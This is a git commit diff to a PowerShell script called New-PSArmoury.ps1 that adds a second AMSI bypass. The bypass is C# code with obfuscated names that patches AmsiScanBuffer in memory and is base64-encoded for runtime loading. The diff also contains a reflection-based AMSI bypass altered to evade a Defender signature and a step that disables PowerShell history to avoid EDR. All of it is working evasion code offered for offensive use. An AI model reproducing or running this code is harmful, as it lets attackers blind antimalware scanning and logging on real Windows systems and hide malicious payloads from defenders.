fed17e7c32ff0ea8f2ff98fad0391ef402f9a1c9
Christoph Falta <cfalta@users.noreply.github.com>
2020-03-20 14:51:12 +0100

    New AMSI bypass
    Added a second amsi bypass that relies on patching the AMSI Scan Buffer.

--- New-PSArmoury.ps1
+++ New-PSArmoury.ps1
@@ -390,12 +390,60 @@ Add-Type -TypeDefinition `$TypeDef
 }
 "@
 
+$AMSIBypass2=@"
+using System;
+using System.Runtime.InteropServices;
+
+namespace RandomNamespace
+{
+    public class RandomClass
+    {
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
+        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+
+        public static void RandomFunction()
+        {
+            IntPtr TargetDLL = LoadLibrary("amsi.dll");
+            IntPtr TotallyNotThatBufferYouRLookingForPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
+
+            UIntPtr dwSize = (UIntPtr)5;
+            uint Zero = 0;
+         
+            VirtualProtect(TotallyNotThatBufferYouRLookingForPtr, dwSize, 0x40, out Zero);
+            Byte[] one = { 0x31 };
+            Byte[] two = { 0xff, 0x90 };
+            int length = one.Length + two.Length;
+            byte[] sum = new byte[length];
+            one.CopyTo(sum,0);
+            two.CopyTo(sum,one.Length);
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
+             Marshal.Copy(sum, 0, unmanagedPointer, 3);
+             MoveMemory(TotallyNotThatBufferYouRLookingForPtr + 0x001b, unmanagedPointer, 3);
+        }
+    }
+}
+"@
+$AMSIBypass2encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($AMSIBypass2))
+
 $BypassStub=@"
 #EDR Bypass
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 
 #AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
 (([Ref].Assembly.gettypes() | where {`$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {`$_.Name -like "amsiInit*ailed"}).SetValue(`$null,`$true)
+
+#AMSI Bypass 2
+`$AMSIBypass2encoded = "$AMSIBypass2encoded"
+`$AMSIBypass2 = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$AMSIBypass2encoded))
+Add-Type -TypeDefinition `$AMSIBypass2
+[RandomNamespace.RandomClass]::RandomFunction()
 "@
 
 if($global:3DES)
